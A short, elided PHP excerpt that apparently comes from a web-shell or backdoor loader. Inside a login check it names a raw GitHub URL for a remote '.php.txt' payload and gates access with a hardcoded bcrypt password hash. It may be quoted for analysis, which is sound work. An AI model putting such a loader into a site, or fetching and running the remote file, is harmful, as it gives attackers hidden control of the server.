...
if (is_logged_in()) {
    ...
    $destiny = 'https://raw.githubusercontent.com/mrwawanj/tiktodv3/refs/heads/master/inammo.txt.php.txt';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$10$fHKr2CJb7LrlGmFUXSkyCefrh5xCDs6Rs/Bugmv9Q/WHZSyv7lgJS'; // https://bcrypt.online/
